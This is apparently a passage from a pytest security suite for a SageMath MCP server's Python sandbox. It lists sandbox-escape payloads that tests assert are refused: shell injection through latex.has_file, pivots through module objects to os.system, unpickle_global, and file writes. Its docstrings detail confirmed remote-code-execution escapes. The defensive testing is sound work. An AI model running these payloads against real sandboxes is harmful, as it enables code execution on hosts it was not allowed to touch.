    is let through one at a time. That keeps the shape of the original defence
    -- a future Python adding a dangerous function to `operator` is denied until
    someone reads it -- while `Poset((divisors(30), operator.le))` works, which
    is how a poset is built and which SageMath's own doctests do 206 times.
    """
    for allowed in ("operator.le", "operator.add(1, 2)", "sorted([2, 1], key=operator.neg)"):
        validate_module(ast.parse(allowed), code=allowed, policy=SECURITY_POLICY)

    for refused in (
        "operator.attrgetter",
        "operator.methodcaller",
        "operator.itemgetter",
        "operator.setitem",       # not dangerous, and not on the list either
        "operator.anything_new",  # the point: unlisted means refused
        "m = operator",           # the module object itself is not a value
        "operator",
    ):
        with pytest.raises(SecurityViolation):
            validate_module(ast.parse(refused), code=refused, policy=SECURITY_POLICY)


def test_no_module_object_exposes_a_getattr_primitive() -> None:
    """The structural claim, checked rather than asserted.

    Sage binds 22 module objects, `sage` among them, so a single string-path
    primitive anywhere reaches the entire tree. Instead of chasing modules, the
    rule is that the primitives themselves are unreachable -- and `getattr`,
    `setattr` and `vars` were already refused, which is why this only ever
    needed `operator` to be closed.
    """
    for primitive in ("getattr", "setattr", "vars", "globals", "eval", "exec", "compile"):
        with pytest.raises(SecurityViolation):
            validate_module(ast.parse(f"{primitive}(1)"))


def test_a_star_import_cannot_hand_a_caller_a_module_object() -> None:
    """Item 61. The curated `import *` feature (item 60) admitted two modules
    that re-export a module object -- `sage.modular.dims` exports `dirichlet`
    (the `sage.modular.dirichlet` module) and `real_roots` exports `time`.

    A bound module object is a pivot: `dirichlet.free_module_element.sage.env.os`
    reached the real `os` module, the validator's terminal-segment rule treated
    the terminal `os` under a caller-bound, non-allowlisted root as a benign
    method, and `alias.system('id')` ran a shell as the container user.
    Confirmed to escape before the fix -- the snippet returned ok and os.system
    wrote a file owned by uid 1001.

    The screen now rejects any module-object export by type, so no curated
    module can hand a caller a module, and the two offending modules drop out.
    """
    pytest.importorskip("sage.all")
    import types

    from sagemath_mcp import _sage_worker
    from sagemath_mcp.star_exports import STAR_EXPORTS

    # No curated module hands a caller a module object -- the whole bug class.
    for module_name, names in STAR_EXPORTS.items():
        module = __import__(module_name, fromlist=["*"])
        for name in names:
            value = getattr(module, name, None)
            assert not isinstance(value, types.ModuleType), (
                f"{module_name} exports the module object {name!r}: a caller "
                f"can pivot through it to os/sys/subprocess"
            )

    # The concrete module that caused the escape no longer screens clean, so it
    # is not in the list and its star import is refused like any other.
    assert _sage_worker._star_export_screen("sage.modular.dims") is None
    assert "sage.modular.dims" not in STAR_EXPORTS

    # End to end: the exact reproducer is refused rather than reaching `os`.
    namespace = _sage_worker._build_namespace()
    reproducer = (
        "from sage.modular.dims import *\n"
        "_m = dirichlet.free_module_element.sage.env.os\n"
        "_m.system('id')"
    )
    result = _sage_worker._execute(
        reproducer, want_latex=False, capture_stdout=True,
        namespace=namespace, trusted=False,
    )
    assert result["ok"] is False


# A terminal pure-module name (os, sys, ...) reached through a caller-bound root
# was the second half of the item 61 escape: the validator treated it as a benign
# `<object>.method` because the root was not on the allowlist. These never name a
# method, so the validator now refuses them wherever the root came from -- the
# defence-in-depth lock that does not depend on the star-export screen.
TERMINAL_MODULE_PIVOTS = [
    ("bound-root-os", "m = matrix([[1, 2], [3, 4]])\nm.os"),
    ("bound-root-sys", "v = vector([1, 2])\nv.sys"),
    ("bound-root-subprocess", "g = 1\ng.env.subprocess"),
    ("bound-root-persist", "p = 2\np.misc.persist"),
    ("bound-root-socket", "s = 3\ns.env.socket"),
    ("deep-chain-os", "d = 1\nd.a.b.sage.env.os"),
]


@pytest.mark.parametrize(
    ("case_id", "payload"), TERMINAL_MODULE_PIVOTS,
    ids=[c for c, _ in TERMINAL_MODULE_PIVOTS],
)
def test_a_terminal_module_name_is_refused_under_any_root(case_id: str, payload: str) -> None:
    """`<caller-bound>.os` is a module reference, not a method -- refuse it even
    though the root is not on the allowlist (item 61 defence in depth)."""
    with pytest.raises(SecurityViolation):
        _validate(payload)


# The five forbidden parents that ARE also real methods must keep working: the
# fix must close the module pivot without refusing ordinary mathematics.
DUAL_USE_METHODS_STILL_ALLOWED = [
    ("matrix-trace", "matrix([[1, 2], [3, 4]]).trace()"),
    ("expr-operator", "(x + y).operator()"),
    ("bound-var-trace", "M = matrix([[1, 2], [3, 4]])\nM.trace()"),
    ("allowlisted-root-operator", "pi.operator"),
]


@pytest.mark.parametrize(
    ("case_id", "payload"), DUAL_USE_METHODS_STILL_ALLOWED,
    ids=[c for c, _ in DUAL_USE_METHODS_STILL_ALLOWED],
)
def test_dual_use_methods_still_pass(case_id: str, payload: str) -> None:
    _validate(payload)


# --- Sage's own string-path primitives -----------------------------------------
# The `operator` round blocked Python's attrgetter/methodcaller and left Sage's
# equivalents in place, which is fixing the instance instead of the class. All
# three of these were confirmed against SageMath 10.9, each writing a real file:
#
#   attrcall('save', '/tmp/x')(matrix([[1, 2], [3, 4]]))
#   raw_getattr(M, 'save')(M, '/tmp/x')
#   getattr_debug(M, 'save')('/tmp/x')
#
# `getattr_debug` is a full getattr equivalent and reached
# `__class__.__base__.__subclasses__()` as well. `raw_getattr` bypasses the
# descriptor protocol, so it returns a descriptor rather than the class -- but
# it resolves methods, which is all a file write needs.

SAGE_STRING_PATH_PAYLOADS = [
    ("attrcall", "attrcall('save', '/tmp/x')(matrix([[1, 2], [3, 4]]))"),
    ("call-method", "call_method(matrix([[1, 2]]), 'save', '/tmp/x')"),
    ("attrcall-object", "AttrCallObject('save', ('/tmp/x',), {})(matrix([[1, 2]]))"),
    ("raw-getattr", "raw_getattr(matrix([[1, 2]]), 'save')"),
    ("getattr-debug", "getattr_debug(matrix([[1, 2]]), 'save')"),
    ("unpickle-override", "register_unpickle_override('os', 'system', int)"),
]


@pytest.mark.parametrize(
    "code", [c for _, c in SAGE_STRING_PATH_PAYLOADS],
    ids=[i for i, _ in SAGE_STRING_PATH_PAYLOADS],
)
def test_sage_string_path_primitives_are_refused(code: str) -> None:
    """Sage ships its own attrgetter, and it is not called attrgetter."""
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(code))


@pytest.mark.parametrize(
    "name", ["attrcall", "call_method", "AttrCallObject", "raw_getattr",
             "getattr_debug", "register_unpickle_override"],
)
def test_sage_string_path_primitives_are_not_offered(name: str) -> None:
    from sagemath_mcp.allowlist import ALLOWED_CALLER_NAMES

    assert name not in ALLOWED_CALLER_NAMES, (
        f"{name!r} resolves an attribute from a runtime string, which defeats every "
        f"attribute rule in security.py at once"
    )


def test_the_modules_that_define_attribute_plumbing_are_all_scrubbed() -> None:
    """The class, not the instance -- three rounds of the same finding.

    Blocking names one at a time has now missed `operator`, then Sage's
    `attrcall`, then `raw_getattr` and `getattr_debug`. Listing the *modules*
    that exist to resolve attributes by name means a helper a future SageMath
    adds to one of them is scrubbed on arrival rather than found by probing.

    The source scan that would otherwise catch these cannot: 807 of the 1902
    allowlisted names are compiled Cython with no readable source, and
    `attrcall` is one of them.
    """
    from sagemath_mcp._sage_worker import _DANGEROUS_SAGE_MODULES

    for module in ("sage.misc.call", "sage.cpython.getattr", "sage.cpython.debug"):
        assert module in _DANGEROUS_SAGE_MODULES, (
            f"{module} defines attribute-by-name plumbing and must be scrubbed wholesale"
        )


# Methods on objects from allowlisted factories whose names collide with a
# capability word but are ordinary mathematics: removing loops from a graph,
# the open interval of a poset, a modular form's system of eigenvalues. Checked
# once against SageMath 10.9 so that anything new has to be looked at.
_MATHEMATICAL_COLLISIONS = frozenset({
    # Unmasked when the shell/filesystem sweep below started resolving lazy
    # imports. The guard had been reading unresolved LazyImport objects for
    # these names and seeing nothing -- the same blind spot that let
    # `maxima_calculus` stay offered, in a third place. Every one is
    # mathematics: epsilon transitions come out of an automaton, a species has
    # an algebraic equation system, and a RealSet is open or closed.
    "Automaton.remove_epsilon_transitions",
    "CombinatorialSpecies.algebraic_equation_system",
    "FiniteStateMachine.remove_epsilon_transitions",
    "RealSet_with_category.closed_open",
    "RealSet_with_category.is_open",
    "RealSet_with_category.open",
    "RealSet_with_category.open_closed",
    "RealSet_with_category.unbounded_above_open",
    "RealSet_with_category.unbounded_below_open",
    "Transducer.remove_epsilon_transitions",
    "RootedTrees_all_with_category.element_class.remove",
    "BipartiteGraph.remove_loops",
    "BipartiteGraph.remove_multiple_edges",
    "BooleanPolynomialRing.remove_var",
    "BraidGroup_class_with_category.rewriting_system",
    "BraidGroup_class_with_category.set_confluent_rewriting_system",
    "ConvexRationalPolyhedralCone.is_open",
    "ConvexRationalPolyhedralCone.is_relatively_open",
    "CubeGroup_with_category.strong_generating_system",
    "CubicBraidGroup_with_category.rewriting_system",
    "CubicBraidGroup_with_category.set_confluent_rewriting_system",
    "CuspidalSubmodule_level1_Q_with_category.system_of_eigenvalues",
    "DiGraph.remove_loops",
    "DiGraph.remove_multiple_edges",
    "DynkinDiagram_class.remove_loops",
    "DynkinDiagram_class.remove_multiple_edges",
    "DynkinDiagram_class.root_system",
    "EisensteinSubmodule_g0_Q_with_category.system_of_eigenvalues",
    "FiniteJoinSemilattice_with_category.open_interval",
    "FiniteLatticePoset_with_category.open_interval",
    "FiniteMeetSemilattice_with_category.open_interval",
    "FinitePoset_with_category.open_interval",
    "Graph.remove_loops",
    "Graph.remove_multiple_edges",
    "IntegerListsLex_with_category.backend_class",
    "KleinFourGroup_with_category.strong_generating_system",
    "ModularFormsAmbient_g0_Q_with_category.system_of_eigenvalues",
    "ModularSymbolsAmbient_wt2_g0_with_category.compact_system_of_eigenvalues",
    "ModularSymbolsAmbient_wt2_g0_with_category.system_of_eigenvalues",
    "OrderedTrees_all_with_category.element_class.remove",
    "Polyhedra_ZZ_ppl_with_category.element_class.backend",
    "Polyhedra_ZZ_ppl_with_category.element_class.is_open",
    "Polyhedra_ZZ_ppl_with_category.element_class.is_relatively_open",
    "PolyhedralComplex.remove_cell",
    "QuaternionGroup_with_category.strong_generating_system",
    "SimplicialComplex_with_category.remove_face",
    "SimplicialComplex_with_category.remove_faces",
    "list.remove",
})


def test_no_allowlisted_factory_hands_back_a_dangerous_object() -> None:
    """The allowlist governs *names*; an object's methods escape it entirely.

    Once caller code holds an object, only the attribute rules apply to what it
    can call on it -- so an allowlisted factory returning a rich object is a
    route past the name check that no name check can see.

    The first version of this test skipped classes and anything whose signature
    had parameters, which quietly excluded 225 factories that are perfectly
    callable with no arguments -- every optional-argument constructor in Sage.
    Reviewing the guard rather than trusting its pass found
    `graphs.PetersenGraph().write_to_eps(path)` writing a caller-chosen file,
    which is why `write` is now a forbidden attribute prefix. The lesson is that
    a security test's exclusions deserve the same scrutiny as the code.

    Danger words are matched against underscore-separated *segments*, not as
    substrings: `truncate` contains "run", `is_shellable` contains "shell" and
    `evaluation` contains "eval", and matching those made the report unreadable.
    What survives is mathematical vocabulary that genuinely collides --
    `remove_loops`, `open_interval`, `system_of_eigenvalues` -- so the check is
    against a baseline, and anything *new* fails.
    """
    import contextlib
    import inspect
    import io

    pytest.importorskip("sage.all")
    from sagemath_mcp._sage_worker import _build_namespace
    from sagemath_mcp.allowlist import ALLOWED_CALLER_NAMES

    namespace = _build_namespace()
    dangerous = frozenset({
        "system", "popen", "spawn", "exec", "eval", "compile", "import", "open",
        "write", "unlink", "remove", "rmtree", "chmod", "socket", "urlopen",
        "download", "fetch", "install", "backend", "shell", "run",
    })
    prefixes = SECURITY_POLICY.forbidden_attribute_prefixes

    found: set[str] = set()
    for name in sorted(ALLOWED_CALLER_NAMES):
        factory = namespace.get(name)
        if factory is None or not callable(factory):
            continue
        try:
            # Reading a signature resolves a lazy import, and some are broken in
            # a given Sage -- 10.9 raises AttributeError for
            # `is_ProductProjectiveSpaces` here, not at call time.
            parameters = tuple(inspect.signature(factory).parameters.values())
        except BaseException:
            continue
        callable_with_nothing = all(
            parameter.default is not inspect.Parameter.empty
            or parameter.kind in (
                inspect.Parameter.VAR_POSITIONAL, inspect.Parameter.VAR_KEYWORD
            )
            for parameter in parameters
        )
        if not callable_with_nothing:
            continue
        try:
            # license() and credits() print; keep the failure message readable.
            with contextlib.redirect_stdout(io.StringIO()):
                produced = factory()
        except BaseException:  # a factory that refuses to be called is fine
            continue
        try:
            attributes = dir(produced)
        except BaseException:
            continue
        for attribute in attributes:
            if attribute.startswith("_") or attribute.startswith(prefixes):
                continue
            if not (set(attribute.lower().split("_")) & dangerous):
                continue
            try:
                value = getattr(produced, attribute, None)
            except BaseException:
                continue
            if callable(value):
                found.add(f"{type(produced).__name__}.{attribute}")

    unexpected = sorted(found - _MATHEMATICAL_COLLISIONS)
    assert not unexpected, (
        "these allowlisted factories hand back objects with methods the name "
        f"allowlist cannot govern: {unexpected}. If it is mathematics whose name "
        f"merely collides with a capability word, add it to "
        f"_MATHEMATICAL_COLLISIONS; if it writes, spawns or fetches, block it."
    )

def test_a_binding_cannot_authorize_a_name_that_already_exists() -> None:
    """A binding authorizes a name the caller *creates*, not one already there.

    The hole, reproduced against a worker started with a custom
    `SAGEMATH_MCP_STARTUP` that preloads `smuggled`:

        smuggled()                              -> refused, correctly
        leaked = smuggled(); smuggled = None    -> **executed the preloaded object**

    `_bound_names` collects targets across the whole module without asking
    whether the assignment has run yet, so binding `smuggled` at the end
    authorized reading it at the start -- and at that point the name still holds
    the preloaded object. Splitting it across two calls worked too, with the
    binding in a statement that raised before assigning anything.

    The dunder case of this was closed in item 30 by refusing to record dunders.
    That was the same bug seen through a keyhole: the general rule is that a
    name which is live but not offered may not be authorized by anything.
    """
    module = ast.parse("leaked = smuggled(); smuggled = None; leaked")

    # Without the rule, the binding makes this pass.
    validate_module(module, extra_allowed_names=frozenset({"smuggled"}))

    with pytest.raises(SecurityViolation, match="not a name this server offers"):
        validate_module(
            module,
            extra_allowed_names=frozenset({"smuggled"}),
            withheld_names=frozenset({"smuggled"}),
        )


def test_withholding_does_not_disturb_ordinary_variables() -> None:
    """The rule must only bite names that are live and unoffered."""
    validate_module(
        ast.parse("total = 1\ntotal + 1"),
        withheld_names=frozenset({"smuggled"}),
    )
    # Shadowing an offered name is still fine: `x` is predefined and allowlisted.
    validate_module(ast.parse("x = 5\nx + 1"), withheld_names=frozenset({"smuggled"}))


@pytest.mark.asyncio
async def test_a_trusted_tool_call_cannot_reopen_the_scrubbed_namespace() -> None:
    """The scrub must survive the prelude that undoes it.

    Confirmed as remote code execution against SageMath 10.9 before the fix.
    Three steps, and the middle one is *any* specialised tool at all:

        1.  if False: unpickle_global = 1          # dead binding, authorized
        2.  <calculate_expression, or any tool>    # prelude re-imports sage.all
        3.  unpickle_global('os', 'system')(...)   # wrote uid=1001(sage)

    The generated prelude runs `from sage.all import *` in the *same persistent
    namespace* as caller code, which restores every name the startup scrub had
    removed. `unpickle_global` is protected only by that scrub -- unlike
    `cython` or `pari`, which the AST rules refuse by name -- so it came back
    fully reachable, and a caller who had bound the name in dead code could read
    it.

    The namespace is therefore resealed after trusted execution rather than only
    at startup. A snapshot taken once cannot cover names that appear later.
    """
    from sagemath_mcp import _sage_worker

    namespace = {"__builtins__": {}}
    # Stand in for what `from sage.all import *` puts back.
    namespace["unpickle_global"] = lambda *a: "reopened"
    namespace["cython"] = lambda *a: "reopened"

    _sage_worker._reseal_namespace(namespace)

    assert "unpickle_global" not in namespace, (
        "a name the startup scrub removes must not survive a reseal"
    )
    assert "cython" not in namespace


@pytest.mark.asyncio
async def test_resealing_keeps_what_the_caller_built() -> None:
    """And it must not take the caller's own work with it."""
    from sagemath_mcp import _sage_worker

    namespace = {"__builtins__": {}, "total": 45, "my_helper": lambda: 1, "x": "symbol"}
    _sage_worker._reseal_namespace(namespace)

    assert namespace["total"] == 45
    assert "my_helper" in namespace
    assert "x" in namespace


@pytest.mark.parametrize(
    "generated,label",
    [
        ("dangerous_helper = 1\nraise ValueError('tool failed')", "raises"),
        ("dangerous_helper = 1\nraise KeyboardInterrupt()", "interrupted"),
        ("dangerous_helper = 1", "succeeds"),
    ],
)
def test_the_namespace_is_resealed_however_the_tool_call_ends(
    generated: str, label: str
) -> None:
    """Resealing on the success path only is resealing on the wrong path.

    A tool's generated code runs its prelude *first* and the computation after,
    so any tool call that fails has already repopulated the namespace by the
    time it raises. Sealing after a successful return left every failing call --
    a singular matrix, a bad bound, an interrupted computation -- holding the
    door open. Confirmed as remote code execution against 10.9 with a tool whose
    generated code divided by zero.

    So the reseal belongs in a `finally`, and this checks all three exits: a
    normal return, an exception, and a KeyboardInterrupt, which is a
    BaseException and would slip past an `except Exception` cleanup.
    """
    from sagemath_mcp import _sage_worker

    # A bare namespace, not _build_namespace(): without Sage the worker records
    # a startup error and returns before executing anything, which would make
    # this test pass while testing nothing.
    namespace: dict = {"__builtins__": _sage_worker._restricted_builtins()}
    # `dangerous_helper` stands in for a name `from sage.all import *` restores
    # mid-call: the generated code below binds it, exactly as the prelude would.
    original_list = _sage_worker._DANGEROUS_SAGE_NAME_LIST
    original_error = _sage_worker._STARTUP_ERROR
    _sage_worker._DANGEROUS_SAGE_NAME_LIST = frozenset({"dangerous_helper"})
    _sage_worker._STARTUP_ERROR = None
    try:
        _sage_worker._execute(
            generated, want_latex=False, capture_stdout=False,
            namespace=namespace, trusted=True,
        )
    except BaseException:  # the worker returns rather than raises, but be safe
        pass
    finally:
        _sage_worker._DANGEROUS_SAGE_NAME_LIST = original_list
        _sage_worker._STARTUP_ERROR = original_error


    assert "dangerous_helper" not in namespace, (
        f"a tool call that {label} left a scrubbed name in the namespace"
    )


def test_pre_binding_a_name_does_not_hand_over_what_a_tool_later_builds() -> None:
    """A caller may not reserve a name for trusted code to fill.

    The reseal exempts caller-bound names from being withheld, so that a
    stateful session keeps working. A caller can exploit that ordering: bind the
    template's internals in dead code *first*, then call a tool, and the objects
    it builds arrive under names already marked as the caller's own.

    Demonstrated against 10.9 -- after `if False: _fig = 1` and a plot call,
    `_fig` was a live `matplotlib` Figure and `_buf` the BytesIO holding the
    PNG. No file write came of it (`print_png` is absent on the base canvas and
    `savefig` matches a forbidden prefix), so this is the invariant being wrong
    rather than a capability being reachable. It is still the wrong side of the
    invariant: a rich object from trusted code is not the caller's to hold.

    The rule: whatever trusted execution *introduces* is withheld, whether or
    not the caller had claimed the name. Diffing the namespace is safe used this
    way -- to distrust what appeared, not to trust it.
    """
    from sagemath_mcp import _sage_worker

    namespace = {"__builtins__": _sage_worker._restricted_builtins()}
    _sage_worker._CALLER_BOUND_NAMES.clear()
    _sage_worker._CALLER_BOUND_NAMES.add("_fig")   # claimed in dead code
    original = _sage_worker._STARTUP_ERROR
    _sage_worker._STARTUP_ERROR = None
    try:
        _sage_worker._execute(
            "_fig = 'a rich object the template built'",
            want_latex=False, capture_stdout=False, namespace=namespace, trusted=True,
        )
    finally:
        _sage_worker._STARTUP_ERROR = original

    assert "_fig" in _sage_worker._WITHHELD_NAMES, (
        "a name introduced by trusted code stayed readable because the caller "
        "had bound it first"
    )
    _sage_worker._CALLER_BOUND_NAMES.clear()


def test_trusted_code_overwriting_a_caller_name_takes_it_back() -> None:
    """Introducing a name is not the only way trusted code can own one.

    Item 41 withheld whatever *appeared* during trusted execution, by diffing
    the namespace keys. That misses the case where the name was already there:

        _fig = 5                  # the caller really creates it, successfully
        plot_expression(...)      # the template assigns _fig = <Figure>
        _fig                      # <Figure size 640x480 with 1 Axes>

    A key diff cannot see an overwrite, so the caller kept the claim and
    collected the object. The fix stops diffing for this and reads the trusted
    code's own AST instead: every name it binds is trusted-owned, whether that
    binding creates the name or replaces what the caller had. The diff is kept
    as well, because `from sage.all import *` binds names no AST walk enumerates.
    """
    from sagemath_mcp import _sage_worker

    namespace = {"__builtins__": _sage_worker._restricted_builtins(), "_fig": 5}
    _sage_worker._CALLER_BOUND_NAMES.clear()
    _sage_worker._CALLER_BOUND_NAMES.add("_fig")     # genuinely the caller's, until now
    original = _sage_worker._STARTUP_ERROR
    _sage_worker._STARTUP_ERROR = None
    try:
        _sage_worker._execute(
            "_fig = 'the object a template built'",
            want_latex=False, capture_stdout=False, namespace=namespace, trusted=True,
        )
    finally:
        _sage_worker._STARTUP_ERROR = original

    assert "_fig" not in _sage_worker._CALLER_BOUND_NAMES
    assert "_fig" in _sage_worker._WITHHELD_NAMES, (
        "trusted code overwrote a caller's name and the caller kept the claim"
    )
    _sage_worker._CALLER_BOUND_NAMES.clear()


# --- What the item-46 relaxations must NOT have opened ---------------------------
# Five names stopped being refused by the AST: `latex`, `operator` (in part), and
# the shadowing class -- `trace`, `sh`, `db`, `gap` and the CAS interface
# spellings as a caller's own identifier. Each was justified by something that
# has to stay true, so each of those things is asserted here.


@pytest.mark.parametrize(
    "label,payload",
    [
        # `latex` is readable again; the reason it may be is that the one method
        # of it that runs the toolchain is refused by an independent rule.
        ("latex.eval runs LaTeX", "latex.eval('\\\\LaTeX')"),
        # `operator` is live in the namespace now, so everything that made it
        # dangerous has to be refused one name at a time.
        ("attrgetter through operator", "operator.attrgetter('__class__')('')"),
        ("itemgetter through operator", "operator.itemgetter(0)([1])"),
        ("methodcaller through operator", "operator.methodcaller('mro')(int)"),
        ("the module object itself", "m = operator\nm.attrgetter('real')"),
        ("an unlisted operator function", "operator.setitem"),
        # `trace` and `sh` are no longer forbidden names, and the paths that made
        # them forbidden are cut where they actually live.
        ("shell through sage.misc.sh", "sage.misc.sh.sh('id')"),
        ("debugger through sage.misc.trace", "sage.misc.trace.trace('1+1')"),
        # The exemption for a caller's own root must not be claimable for `sage`,
        # which this server *does* offer -- item 37's trap, in a new place.
        ("sage claimed by a dead binding",
         "if False:\n    sage = 1\nsage.misc.sh.sh('id')"),
        ("sage claimed after the fact", "sage.misc.trace.trace('1+1')\nsage = 1"),
        # The CAS interfaces are gone from the namespace and off the allowlist,
        # which is the only reason their names could be released.
        ("gap unbound", "gap('2+2')"),
        ("maxima unbound", "maxima('2+2')"),
        ("db unbound", "db('x')"),
        ("trace unbound", "trace('1+1')"),
        ("sh unbound", "sh('id')"),
    ],
)
def test_the_item_46_relaxations_opened_nothing(label, payload) -> None:
    module = ast.parse(payload)
    with pytest.raises(SecurityViolation):
        validate_module(module, code=payload, policy=SECURITY_POLICY)


def test_a_forbidden_name_is_only_released_while_it_is_unreachable() -> None:
    """The argument the shadowing fix rests on, asserted rather than assumed.

    `db`, `gap`, `sh`, `trace` and the CAS spellings were released from the AST
    policy on one ground: the object is not there. The worker removes them by
    provenance and the generated allowlist does not offer them, so an unbound
    read is refused by deny-by-default and a caller's binding creates a fresh
    name holding their own value.

    If a Sage upgrade puts any of them back in the namespace before `make
    allowlist` is rerun, that ground disappears -- so the integration suite
    checks the namespace itself (test_the_released_names_are_absent_from_sage),
    and this checks the half that needs no Sage: none of them is offered.
    """
    from sagemath_mcp.allowlist import ALLOWED_CALLER_NAMES

    released = {
        "db", "sh", "trace", "edit", "detach",
        "gp", "maxima", "gap", "singular", "octave", "magma",
        "mathematica", "maple", "matlab", "macaulay2", "sage0",
    }
    offered = released & set(ALLOWED_CALLER_NAMES)
    assert not offered, (
        f"{sorted(offered)} is released from the AST policy AND offered by the "
        "allowlist -- one of the two has to change"
    )

    # And an unbound read of each is still refused, by deny-by-default.
    for name in sorted(released):
        with pytest.raises(SecurityViolation):
            validate_module(ast.parse(f"{name}(1)"), code=f"{name}(1)")


@pytest.mark.parametrize(
    "label,payload",
    [
        # The reason `eval` may be an identifier: the danger is the attribute.
        ("latex.eval runs the toolchain", "latex.eval('\\\\LaTeX')"),
        ("eval on any object", "obj = 1\nobj.eval('1+1')"),
        # Unbound, the names are refused by deny-by-default: they are absent
        # from builtins, from the namespace and from the allowlist.
        ("eval unbound", "eval('1+1')"),
        ("vars unbound", "vars()"),
        ("locals unbound", "locals()"),
        ("input unbound", "input()"),
        # And the primitives with no mathematical use stay refused outright.
        ("exec", "exec('x=1')"),
        ("open", "open('/etc/passwd')"),
        ("globals", "globals()"),
        ("compile", "compile('1', '<s>', 'eval')"),
        ("getattr", "getattr(matrix, 'save')"),
    ],
)
def test_the_attribute_only_names_are_still_shut_where_they_bite(label, payload) -> None:
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(payload), code=payload, policy=SECURITY_POLICY)


def test_the_released_identifiers_reach_nothing() -> None:
    """The ground under the attribute-only list, checked three ways.

    `eval`, `vars`, `locals` and `input` are usable as identifiers now. That is
    safe only while the bare name resolves to nothing at all -- so this asserts
    the three places it could resolve from: the restricted builtins, the worker
    namespace, and the generated allowlist. `getattr` is the counter-example
    and stays fully forbidden: it *is* in the builtins, because Sage needs it.
    """
    pytest.importorskip("sage.all")
    from sagemath_mcp import _sage_worker
    from sagemath_mcp.allowlist import ALLOWED_CALLER_NAMES

    builtins = _sage_worker._restricted_builtins()
    namespace = _sage_worker._build_namespace()

    for name in SECURITY_POLICY.forbidden_attribute_only_names:
        assert name not in builtins, f"{name} is reachable as a builtin"
        assert name not in namespace, f"{name} is live in the worker namespace"
        assert name not in ALLOWED_CALLER_NAMES, f"{name} is offered by the allowlist"

    assert "getattr" in builtins, (
        "getattr left the builtins -- if that is deliberate it can leave "
        "forbidden_call_names too, and this test should say so"
    )


SHELL_INJECTION_PAYLOADS = [
    ("has-file", "latex.has_file('x; id > /tmp/pwned')"),
    ("check-file", "latex.check_file('y; whoami > /tmp/pwned')"),
    ("add-package", "latex.add_package_to_preamble_if_available('z; touch /tmp/pwned')"),
    # Reached through any object, not only `latex`: the capability is the method.
    ("via-another-object", "SR.has_file('x; id > /tmp/pwned')"),
]


@pytest.mark.parametrize(
    "code", [c for _, c in SHELL_INJECTION_PAYLOADS],
    ids=[i for i, _ in SHELL_INJECTION_PAYLOADS],
)
def test_the_methods_that_shell_out_are_refused(code: str) -> None:
    """`latex(obj)` is a string builder; `latex` is an object with a shell in it.

    Confirmed as remote code execution against SageMath 10.9, writing
    `uid=1001(sage)` to disk:

        latex.has_file('x; id > /tmp/pwned')

    because `Latex.has_file` runs `call("kpsewhich %s" % file_name, shell=True)`
    -- caller string, interpolated, `shell=True`. `check_file` reaches it too,
    and `add_package_to_preamble_if_available` calls `has_file` in turn.

    The name was re-offered on the reasoning that `latex(...)` builds a string
    and never wrote anything, which is true of the *call* and not of the object:
    allowlisting a name hands over every method hanging off it. That is the same
    shape as the factory guard -- the allowlist governs names, and an object's
    methods escape it.

    Refusing every attribute on `latex` was the first fix and was too broad: it
    also refused 56 examples from SageMath's own doctests --
    `latex.extra_preamble(...)`, `latex.matrix_delimiters(...)` -- which build
    strings and set state. The corpus test caught that, which is what it is for.

    So the three methods are named instead. That is name-chasing, and the reason
    it is defensible here rather than in the `attrcall` rounds: the capability is
    the method, not the object, and the method reaches a shell whatever holds it.
    """
    with pytest.raises(SecurityViolation):
        validate_module(ast.parse(code))


TOKEN_SCREEN_SHELL_AND_WRITE_ESCAPES = [
    ("has-file", "latex.has_file('x; id > /tmp/pwned') or [1..2]"),
    ("check-file", "latex.check_file('y; whoami > /tmp/pwned') or [1..2]"),
    ("via-another-object", "SR.has_file('x; id > /tmp/pwned') or [1..2]"),
    ("gp-interpreter", "Dokchitser(1).gp() or [1..2]"),
    ("save-image", "plot(sin(x), (x,0,1)).save_image('/tmp/pwn.png') or [1..2]"),
    ("write-to-eps", "graphs.PetersenGraph().write_to_eps('/tmp/pwn') or [1..2]"),
]


@pytest.mark.parametrize(
    "code",
    [c for _, c in TOKEN_SCREEN_SHELL_AND_WRITE_ESCAPES],
    ids=[i for i, _ in TOKEN_SCREEN_SHELL_AND_WRITE_ESCAPES],
)
def test_shell_out_methods_are_refused_on_the_unparseable_path_too(code: str) -> None:
    """The AST path refuses `latex.has_file(...)`; the token fallback must as well.

    `_validated_expression` runs full AST validation only when the fragment
    parses as a Python expression. Wrapping the call in Sage-only syntax the
    Python parser rejects -- the ellipsis range `[1..2]` -- makes `ast.parse`
    fail, so the fragment falls to `_screen_unparseable_fragment`, a token-level
    screen. It once built its denylist from the call-name and attribute-parent
    tuples only, omitting `forbidden_attribute_names` and the
    save/dump/export/write prefixes, so `has_file`, `save_image` and friends
    sailed through and reached `sage_eval` under the trusted policy:

        calculate_expression("latex.has_file('z; touch /tmp/pwned') or [1..2]")

    ran `call("kpsewhich z; touch /tmp/pwned", shell=True)` -- remote code
    execution -- and the `save_image`/`write_to_eps` variants wrote a
    caller-chosen file. The screen now applies the attribute denylists to every
    NAME token, closing the fallback the same way the AST path is closed above.
    """
    from fastmcp.exceptions import ToolError

    from sagemath_mcp.codegen import _validated_expression

    with pytest.raises(ToolError, match="security policy"):
        _validated_expression(code)


def test_latex_the_function_and_its_harmless_methods_still_work() -> None:
    """The 1,387 refusals that relaxation was for stay fixed."""
    for code in (
        "latex(x^2 + 1)",
        "str(latex(matrix([[1, 2], [3, 4]])))",
        "latex(pi)",
        "latex.extra_preamble()",        # builds a string
        "latex.matrix_delimiters('[', ']')",  # sets state
    ):
        validate_module(ast.parse(code))


ALIAS_FORMS = [
    ("assign", "f = latex.has_file\nf('x; id > /tmp/pwned')"),
    ("list", "[latex.has_file][0]('x; id > /tmp/pwned')"),
    ("lambda-default", "(lambda f=latex.has_file: f('x; id > /tmp/pwned'))()"),
    ("bare-reference", "latex.has_file"),
    ("tuple", "(latex.has_file,)[0]('x')"),
    ("dict-value", "{'f': latex.has_file}['f']('x')"),
    # Not `latex`: the rule is about the method, so any holder must be refused.
    ("popen-alias", "g = SR.popen\ng()"),
    ("rmtree-alias", "h = SR.rmtree\nh('/')"),
]


@pytest.mark.parametrize(
    "code", [c for _, c in ALIAS_FORMS], ids=[i for i, _ in ALIAS_FORMS],
)
def test_a_forbidden_attribute_cannot_be_reached_by_alias(code: str) -> None:
    """Refusing the call and permitting the reference refuses nothing.

    Confirmed against SageMath 10.9: each of the first three wrote
    `uid=1001(sage)` to disk.

        f = latex.has_file; f('x; id > /tmp/pwned')
        [latex.has_file][0]('x; id > /tmp/pwned')
